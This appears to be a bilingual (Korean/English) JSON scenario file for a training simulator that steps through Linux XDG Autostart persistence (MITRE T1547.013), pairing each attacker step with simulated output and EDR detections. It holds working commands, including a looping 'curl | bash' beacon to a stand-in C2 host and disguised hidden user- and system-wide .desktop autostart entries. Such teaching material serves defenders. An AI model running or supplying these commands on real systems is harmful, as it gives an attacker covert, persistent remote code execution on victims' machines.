@@ -1,0 +1,189 @@
+{
+  "id": "T1547.013",
+  "title": "XDG Autostart 지속성 시뮬레이션",
+  "titleEn": "XDG Autostart Persistence Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ 페이로드 준비", "labelEn": "⚡ Payload Prep", "steps": [1] },
+    { "label": "🔓 Autostart 등록", "labelEn": "🔓 Autostart Setup", "steps": [2, 3] },
+    { "label": "🛡️ 검증", "labelEn": "🛡️ Verification", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "victim", "label": "Victim Linux\nUBUNTU-WS01", "x": 250, "y": 80 },
+    { "id": "autostart", "label": "~/.config/\nautostart/", "x": 400, "y": 30 },
+    { "id": "etcxdg", "label": "/etc/xdg/\nautostart/", "x": 400, "y": 130 },
+    { "id": "c2", "label": "C2 Server\n198.51.100.45", "x": 50, "y": 160 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "minStep": 0 },
+    { "from": "victim", "to": "autostart", "minStep": 2 },
+    { "from": "victim", "to": "etcxdg", "minStep": 3 },
+    { "from": "autostart", "to": "c2", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Trash", "icon": "🗑️" },
+    { "name": "Terminal", "icon": "💻" },
+    { "name": "Files", "icon": "📁" },
+    { "name": "System Monitor", "icon": "📊" },
+    { "name": "Settings", "icon": "⚙️" }
+  ],
+  "steps": [
+    {
+      "cmd": "ls -la ~/.config/autostart/ 2>/dev/null && ls -la /etc/xdg/autostart/ 2>/dev/null | head -10",
+      "out": "/home/user/.config/autostart/:\ntotal 12\ndrwxr-xr-x 2 user user 4096 Mar  1 09:00 .\ndrwxr-xr-x 5 user user 4096 Mar  1 09:00 ..\n-rw-r--r-- 1 user user  234 Feb 15 14:30 slack.desktop\n\n/etc/xdg/autostart/:\ntotal 48\n-rw-r--r-- 1 root root  312 Jan 10 08:00 gnome-keyring-pkcs11.desktop\n-rw-r--r-- 1 root root  298 Jan 10 08:00 gnome-keyring-secrets.desktop\n-rw-r--r-- 1 root root  287 Jan 10 08:00 gnome-keyring-ssh.desktop\n\n[*] User autostart: writable, 1 existing entry\n[*] System autostart: root required, 3 GNOME entries\n[*] Desktop environment: GNOME 42",
+      "def": "[EDR] Autostart directory enumeration detected - potential persistence reconnaissance",
+      "defAction": "Source: auditd file access monitoring\nTarget: ~/.config/autostart/ and /etc/xdg/autostart/\nAction: Directory listing logged, baseline comparison",
+      "desc": "XDG Autostart 디렉토리의 현재 항목을 열거하여 환경을 파악합니다.",
+      "descEn": "The attacker enumerates current XDG Autostart directory entries to understand the environment.",
+      "stepTitle": "XDG Autostart 디렉토리 정찰",
+      "stepTitleEn": "XDG Autostart Directory Reconnaissance",
+      "feynman": "새 교실에 들어가서 어떤 학생들이 이미 자리에 앉아있는지 확인하는 것과 같습니다. 이미 있는 .desktop 파일들의 이름과 형식을 파악하면, 비슷한 형식으로 악성 파일을 만들 수 있습니다.",
+      "feynmanEn": "It's like entering a new classroom and checking which students are already seated. Understanding the names and format of existing .desktop files lets you create malicious files in a similar format.",
+      "expert": "XDG Autostart은 freedesktop.org 표준으로, GNOME, KDE, XFCE 등 대부분의 Linux 데스크톱 환경에서 지원됩니다. 사용자별(~/.config/autostart/)과 시스템 전체(/etc/xdg/autostart/) 두 위치가 있으며, 사용자별 위치는 일반 사용자 권한으로 수정 가능합니다.",
+      "expertEn": "XDG Autostart is a freedesktop.org standard supported by most Linux desktop environments including GNOME, KDE, and XFCE. It has per-user (~/.config/autostart/) and system-wide (/etc/xdg/autostart/) locations, with the per-user location modifiable with regular user privileges.",
+      "defTooltip": "🔐 XDG Autostart 디렉토리 열거 감지! 지속성 정찰의 전형적 패턴입니다.",
+      "defTooltipEn": "🔐 XDG Autostart directory enumeration detected! Typical persistence reconnaissance pattern.",
+      "hackerLog": {
+        "title": "autostart_recon.txt",
+        "lines": [
+          { "log": "User autostart: writable, 1 existing entry", "desc": "💡 사용자 autostart 디렉토리 쓰기 가능 - 가장 쉬운 진입점" },
+          { "log": "System autostart: root required", "desc": "💡 시스템 전체 autostart는 root 권한 필요" },
+          { "log": "Desktop environment: GNOME 42", "desc": "💡 GNOME 환경 확인 - XDG Autostart 지원 확정" }
+        ]
+      },
+      "terms": [
+        { "name": "XDG Autostart", "desc": "freedesktop.org 표준으로 정의된 Linux 데스크톱 자동 시작 메커니즘. .desktop 파일로 관리됩니다." },
+        { "name": ".desktop 파일", "desc": "Linux 데스크톱 환경의 앱 실행 설정 파일. 프로그램 이름, 실행 경로, 아이콘 등을 정의합니다." },
+        { "name": "freedesktop.org", "desc": "Linux 데스크톱 환경 간의 상호 운용성을 위한 표준을 정의하는 프로젝트입니다." }
+      ]
+    },
+    {
+      "cmd": "mkdir -p /tmp/.cache && echo '#!/bin/bash\nnohup bash -c \"while true; do curl -s https://198.51.100.45/beacon | bash; sleep 300; done\" &' > /tmp/.cache/updater.sh && chmod +x /tmp/.cache/updater.sh",
+      "out": "[*] Payload staged:\n    Path: /tmp/.cache/updater.sh\n    Type: Bash reverse shell script\n    Size: 128 bytes\n    Permissions: -rwxr-xr-x\n\n[*] Script behavior:\n    - Runs in background (nohup)\n    - Beacons to C2 every 5 minutes\n    - Downloads and executes commands\n    - Hidden in dot-prefixed directory",
+      "def": "[EDR] Executable script created in /tmp hidden directory - suspicious staging activity",
+      "defAction": "Source: auditd file creation monitoring\nTarget: /tmp/.cache/updater.sh\nAction: Script content analyzed - C2 beacon pattern detected, file quarantined",
+      "desc": "C2 비콘 스크립트를 /tmp의 숨김 디렉토리에 배치합니다.",
+      "descEn": "The attacker stages a C2 beacon script in a hidden directory under /tmp.",
+      "stepTitle": "C2 비콘 스크립트 배치",
+      "stepTitleEn": "C2 Beacon Script Staging",
+      "feynman": "비밀 전화를 걸기 위한 전화번호를 메모지에 적어 숨겨두는 것과 같습니다. 이 스크립트는 5분마다 공격자의 서버에 '명령 있나요?'라고 물어보고, 받은 명령을 실행합니다.",
+      "feynmanEn": "It's like writing a secret phone number on a note and hiding it. This script asks the attacker's server 'any commands?' every 5 minutes and executes whatever it receives.",
+      "expert": "nohup과 백그라운드 실행(&)을 조합하면 터미널 세션이 종료되어도 프로세스가 유지됩니다. curl | bash 패턴은 원격 서버의 명령을 파일 없이 메모리에서 직접 실행하는 fileless 기법입니다. /tmp/.cache는 도트 프리픽스로 기본 ls 출력에서 숨겨집니다.",
+      "expertEn": "Combining nohup with background execution (&) keeps the process alive even after terminal session ends. The curl | bash pattern executes remote commands directly in memory without files (fileless technique). /tmp/.cache is hidden from default ls output with the dot prefix.",
+      "defTooltip": "🔐 /tmp 숨김 디렉토리에 실행 스크립트 생성! C2 비콘 패턴이 감지되었습니다.",
+      "defTooltipEn": "🔐 Executable script created in /tmp hidden directory! C2 beacon pattern detected.",
+      "hackerLog": {
+        "title": "beacon_staging.txt",
+        "lines": [
+          { "log": "Path: /tmp/.cache/updater.sh", "desc": "💡 도트 프리픽스 디렉토리로 기본 ls에서 숨김" },
+          { "log": "Beacons to C2 every 5 minutes", "desc": "💡 5분 간격으로 C2 서버에 접속하여 명령 수신" },
+          { "log": "Downloads and executes commands", "desc": "💡 curl | bash 패턴 - fileless 실행" }
+        ]
+      },
+      "terms": [
+        { "name": "nohup", "desc": "No Hang Up의 약자. 터미널이 닫혀도 프로세스가 종료되지 않게 하는 Linux 명령입니다." },
+        { "name": "C2 비콘 (Beacon)", "desc": "감염된 시스템이 C2 서버에 주기적으로 연결하여 명령을 대기하는 통신 패턴입니다." },
+        { "name": "Fileless 실행", "desc": "디스크에 파일을 저장하지 않고 메모리에서 직접 코드를 실행하는 기법. curl | bash가 대표적입니다." }
+      ]
+    },
+    {
+      "cmd": "cat > ~/.config/autostart/system-update.desktop << 'EOF'\n[Desktop Entry]\nType=Application\nName=System Update Service\nExec=/tmp/.cache/updater.sh\nHidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nComment=Automatic system update checker\nEOF",
+      "out": "[*] Autostart .desktop file created:\n    Path: ~/.config/autostart/system-update.desktop\n    Name: System Update Service\n    Exec: /tmp/.cache/updater.sh\n    NoDisplay: true (hidden from app menu)\n    GNOME Autostart: enabled\n\n[*] Persistence established:\n    - Triggers at GNOME session start\n    - No root privileges needed\n    - Hidden from application menu\n    - Name mimics system update service",
+      "def": "[EDR] New .desktop file in user autostart directory with NoDisplay=true",
+      "defAction": "Source: inotify file monitoring\nTarget: ~/.config/autostart/system-update.desktop\nAction: .desktop file analyzed - Exec points to /tmp script, flagged as suspicious",
+      "desc": "사용자 autostart 디렉토리에 악성 .desktop 파일을 생성하여 로그인 시 자동 실행합니다.",
+      "descEn": "The attacker creates a malicious .desktop file in the user autostart directory for auto-execution at login.",
+      "stepTitle": "사용자 Autostart에 악성 .desktop 파일 생성",
+      "stepTitleEn": "Malicious .desktop File in User Autostart",
+      "feynman": "회사 출입 카드 리더기에 '매일 아침 이 방의 불을 켜라'는 규칙을 추가하는 것과 같습니다. GNOME이 시작될 때 autostart 디렉토리를 확인하고, 이 .desktop 파일을 찾아서 Exec에 지정된 스크립트를 자동으로 실행합니다.",
+      "feynmanEn": "It's like adding a rule to the office card reader saying 'turn on the lights in this room every morning.' When GNOME starts, it checks the autostart directory, finds this .desktop file, and automatically executes the script specified in Exec.",
+      "expert": ".desktop 파일은 freedesktop.org Desktop Entry 표준을 따르며, 단순한 INI 형식의 텍스트 파일입니다. NoDisplay=true는 앱 메뉴에서 숨기고, X-GNOME-Autostart-enabled=true는 GNOME 환경에서 자동 시작을 활성화합니다. Exec 값이 /tmp를 가리키는 것은 주요 탐지 지표입니다.",
+      "expertEn": "The .desktop file follows the freedesktop.org Desktop Entry standard and is a simple INI-format text file. NoDisplay=true hides it from the app menu, and X-GNOME-Autostart-enabled=true enables auto-start in GNOME. Exec pointing to /tmp is a key detection indicator.",
+      "defTooltip": "🔐 사용자 autostart에 NoDisplay=true인 .desktop 파일! Exec가 /tmp 스크립트를 가리킵니다.",
+      "defTooltipEn": "🔐 .desktop file with NoDisplay=true in user autostart! Exec points to /tmp script.",
+      "hackerLog": {
+        "title": "desktop_file_create.txt",
+        "lines": [
+          { "log": "NoDisplay: true (hidden from app menu)", "desc": "💡 앱 메뉴에서 숨김 - 사용자가 발견하기 어려움" },
+          { "log": "Name mimics system update service", "desc": "💡 합법적 시스템 서비스 이름으로 위장" },
+          { "log": "No root privileges needed", "desc": "💡 사용자 홈 디렉토리이므로 일반 권한으로 생성 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "NoDisplay", "desc": ".desktop 파일의 속성. true로 설정하면 앱 메뉴나 파일 관리자에 표시되지 않습니다." },
+        { "name": "X-GNOME-Autostart-enabled", "desc": "GNOME 환경 전용 속성. true일 때 GNOME 세션 시작 시 자동 실행됩니다." },
+        { "name": "Desktop Entry", "desc": "freedesktop.org 표준의 앱 정의 형식. Type, Name, Exec 등의 키를 사용합니다." }
+      ]
+    },
+    {
+      "cmd": "sudo cp ~/.config/autostart/system-update.desktop /etc/xdg/autostart/gnome-update-service.desktop && sudo sed -i 's|/tmp/.cache/updater.sh|/usr/lib/gnome-update-service|' /etc/xdg/autostart/gnome-update-service.desktop && sudo cp /tmp/.cache/updater.sh /usr/lib/gnome-update-service && sudo chmod +x /usr/lib/gnome-update-service",
+      "out": "[*] System-wide autostart created:\n    Path: /etc/xdg/autostart/gnome-update-service.desktop\n    Binary: /usr/lib/gnome-update-service\n    Name: System Update Service\n\n[*] Dual persistence:\n    - User autostart: ~/.config/autostart/ (user level)\n    - System autostart: /etc/xdg/autostart/ (all users)\n    - System binary placed in /usr/lib/ (trusted path)\n    - GNOME naming convention for stealth",
+      "def": "[EDR] CRITICAL - New system-wide autostart entry with binary in /usr/lib",
+      "defAction": "Source: auditd + file integrity monitoring\nTarget: /etc/xdg/autostart/ and /usr/lib/\nAction: Both entries removed, binary quarantined, root access investigated",
+      "desc": "root 권한으로 시스템 전체 autostart에도 등록하여 이중 지속성을 확보합니다.",
+      "descEn": "The attacker registers in system-wide autostart with root privileges for dual persistence.",
+      "stepTitle": "시스템 전체 Autostart 등록 (이중 지속성)",
+      "stepTitleEn": "System-Wide Autostart Registration (Dual Persistence)",
+      "feynman": "개인 방에 알람 시계를 놓는 것에 추가로, 건물 전체 방송 시스템에도 알람을 설정하는 것과 같습니다. 누가 로그인하든 악성 코드가 실행됩니다.",
+      "feynmanEn": "It's like placing an alarm clock in your room and also setting up an alarm on the building's PA system. The malicious code runs no matter who logs in.",
+      "expert": "/etc/xdg/autostart/에 배치하면 모든 사용자의 데스크톱 세션에서 실행됩니다. /usr/lib/에 바이너리를 배치하면 신뢰할 수 있는 시스템 경로처럼 보입니다. gnome-update-service라는 이름은 GNOME의 기존 서비스 명명 규칙을 따라 위장합니다.",
+      "expertEn": "Placing in /etc/xdg/autostart/ runs in all users' desktop sessions. Binary in /usr/lib/ appears as a trusted system path. The name gnome-update-service follows GNOME's existing service naming convention for disguise.",
+      "defTooltip": "🔐 시스템 전체 autostart에 새 항목! /usr/lib에 알려지지 않은 바이너리가 배치되었습니다.",
+      "defTooltipEn": "🔐 New system-wide autostart entry! Unknown binary placed in /usr/lib.",
+      "hackerLog": {
+        "title": "system_autostart.txt",
+        "lines": [
+          { "log": "System binary placed in /usr/lib/ (trusted path)", "desc": "💡 신뢰할 수 있는 시스템 경로에 배치 - 경로 기반 탐지 우회" },
+          { "log": "GNOME naming convention for stealth", "desc": "💡 gnome-* 명명 규칙 사용 - GNOME 정상 서비스로 위장" },
+          { "log": "Dual persistence: user + system level", "desc": "💡 사용자별 + 시스템 전체 이중 지속성" }
+        ]
+      },
+      "terms": [
+        { "name": "/etc/xdg/autostart/", "desc": "시스템 전체의 XDG Autostart 디렉토리. 모든 사용자의 데스크톱 세션에서 실행됩니다." },
+        { "name": "/usr/lib/", "desc": "Linux 시스템 라이브러리와 바이너리가 저장되는 디렉토리. 시스템 구성 요소가 위치하는 신뢰 경로입니다." },
+        { "name": "이중 지속성", "desc": "사용자 수준과 시스템 수준 모두에 지속성을 설정하여 하나가 제거되어도 다른 하나가 동작하도록 보장합니다." }
+      ]
+    },
+    {
+      "cmd": "# [Verification] User logout/login and autostart persistence check",
+      "out": "[GNOME Session Start - UBUNTU-WS01]\n\n[Session startup - autostart triggers]\n1. User autostart → system-update.desktop\n   > /tmp/.cache/updater.sh executed\n   > C2 beacon: 198.51.100.45:443 ESTABLISHED\n   > Running as: user (uid=1000)\n\n2. System autostart → gnome-update-service.desktop\n   > /usr/lib/gnome-update-service executed\n   > Duplicate process detected (same script)\n   > Second instance terminated (PID file check)\n\n[+] User autostart persistence: ACTIVE\n[+] System autostart persistence: ACTIVE (redundant)\n[+] C2 connectivity: ESTABLISHED\n[+] Beacon interval: 300 seconds",
+      "def": "[SIEM] Dual XDG autostart persistence triggered - user and system level coordination",
+      "defAction": "Source: auditd + EDR\nTarget: UBUNTU-WS01 GNOME session\nAction: Both .desktop files removed, binaries quarantined, user credentials rotated",
+      "desc": "재로그인 후 이중 XDG Autostart 지속성이 정상 동작하는지 검증합니다.",
+      "descEn": "The attacker verifies dual XDG Autostart persistence works correctly after re-login.",
+      "stepTitle": "재로그인 후 이중 Autostart 검증",
+      "stepTitleEn": "Post-Login Dual Autostart Verification",
+      "feynman": "집을 나갔다 돌아왔을 때 개인 알람과 건물 알람이 모두 울리는지 확인하는 것과 같습니다. 하나를 끄면 다른 하나가 계속 울립니다.",
+      "feynmanEn": "It's like leaving and coming back home to check if both your personal alarm and the building alarm go off. Turning off one leaves the other still ringing.",
+      "expert": "이중 지속성(사용자 autostart + 시스템 autostart)은 서로 다른 디렉토리와 권한 수준을 사용하므로, 방어자가 하나만 제거할 경우 다른 하나가 동작합니다. PID 파일 기반 중복 실행 방지는 두 autostart에서 동일 프로세스가 2개 실행되는 것을 방지합니다. 완전한 제거를 위해서는 양쪽 .desktop 파일과 실행 바이너리를 모두 삭제해야 합니다.",
+      "expertEn": "Dual persistence (user autostart + system autostart) uses different directories and privilege levels, so removing only one leaves the other operational. PID file-based duplicate prevention stops two instances from the dual autostart. Complete removal requires deleting both .desktop files and execution binaries.",
+      "defTooltip": "🔐 이중 XDG Autostart 지속성이 활성화! 사용자 + 시스템 수준 조율 동작입니다.",
+      "defTooltipEn": "🔐 Dual XDG Autostart persistence activated! User + system level coordinated operation.",
+      "hackerLog": {
+        "title": "autostart_verify.txt",
+        "lines": [
+          { "log": "C2 beacon: 198.51.100.45:443 ESTABLISHED", "desc": "💡 C2 서버 연결 성공 - 원격 제어 가능" },
+          { "log": "Second instance terminated (PID file check)", "desc": "💡 PID 파일로 중복 실행 방지 - 탐지 가능성 감소" },
+          { "log": "Beacon interval: 300 seconds", "desc": "💡 5분 간격으로 C2 통신 - 네트워크 모니터링으로 탐지 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "PID 파일", "desc": "프로세스 ID를 저장하는 파일. 같은 프로그램의 중복 실행을 방지하기 위해 사용됩니다." },
+        { "name": "GNOME 세션", "desc": "GNOME 데스크톱 환경의 사용자 로그인 세션. 로그인 시 XDG Autostart 항목이 실행됩니다." },
+        { "name": "auditd", "desc": "Linux 감사 데몬. 파일 접근, 프로세스 실행 등 시스템 이벤트를 로깅합니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash (attacker)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "ls (autostart enum)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "bash (script creation)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "cat (desktop file creation)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "sudo cp (system autostart)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "[After Re-Login]", "depth": 0, "alert": false, "minStep": 4 },
+    { "name": "updater.sh (PID: 9201)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "curl → bash (C2 beacon)", "depth": 2, "alert": true, "minStep": 4 }
+  ]
+}
